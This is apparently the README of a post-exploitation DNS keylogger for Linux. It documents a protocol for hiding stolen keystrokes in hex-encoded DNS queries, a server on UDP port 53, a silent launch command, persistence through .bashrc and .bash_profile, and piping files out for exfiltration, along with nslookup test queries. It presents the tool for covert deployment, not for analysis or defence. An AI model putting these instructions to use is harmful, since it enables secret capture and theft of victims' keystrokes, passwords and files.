# DNS Keylogger
This post-exploitation keylogger will automatically report a computer's keystrokes.

This takes advantage of DNS tunelling/exfiltration.

# Protocol
## Starting a Connection
A record requests starting with `a` indicate the start of a "connection." When the server receives them, it will respond with a fake non-reserved IP address where the last octet contains the id of the client.
It is in the format of `a.1.1.1.[sld].[tld].`

Concurrent connections cannot exceed 254, and clients are never considered "disconnected."
## Exfiltrating Data
A record requests starting with `b` indicate exfiltrated data being sent to the server.
It is in the format of `b.[packet #].[id].[data].[sld].[tld].`

`id` is the id that was established on connection. Data is sent as ASCII data in hex.
## Malformed Record Requests
If the client sends an malformed record request, the server will respond with an ip address starting with `201`.
## Non-Existant Connections
If the client sends a data packet with an id greater than the # of connections, the server will respond with an IP address starting with `202`.
## Out of Order Packets
Occurs when client sends a packet with packet_id that doesn't match what is expected. The server responds with an IP address starting with `203`. Clients and servers should reset their packet numbers to 0. Then the client can resend the packet.
## Reached Max Connection
If the client attempts to create a connection when the max has reached, the server will respond with an IP address starting with `204`. Clients can keep trying, but until the server is reset, it won't be able to connect.
## Dropped Packets
Clients should rely on responses as acknowledgements of received packets. If they do not receive a response, resend the same payload.

# Server
## Listens on UDP port 53 for DNS packets
Looks for A record and CNAME record requests. Once an A record has been received, the rest of the data from the client should be CNAME record requests. Use the `-p` flag to specify a port to listen on.

# Client
## Linux
The Linux keylogger is two bash scripts. `connection.sh` is used by the `logger.sh` script to send the keystrokes to the server. If you want to manually send data, such as a file, you can pipe data to the `connection.sh` script. It will automatically establish a connection and send the data. 

To start the keylogger, run the command `./logger.sh && exit`. This will silently start the keylogger, and any inputs typed will be sent. `logger.sh` and `connection.sh` must be in the same directory for the keylogger to work. If you want persistance, you can add the command to the .bashrc and/or .bash_profile to start on a new interactive shell or on login.

### Sending Test Requests
You can use `nslookup` to send requests to the server:

`nslookup -query=A a.1.1.1.example.com 127.0.0.1` sends a connection request to localhost.

`nslookup -query=A b.1.1.54686520717569636B2062726F776E20666F782E1B.example.com 127.0.0.1` to send a test message to localhost.

The `sld` can be anything if you're testing on localhost, but you need to put something there.

# Side Notes
## Log file
The log file containing user inputs contains ASCII control characters, such as backspace, delete, and carriage return. If you print the contents using something like `cat`, you may not see all of the data.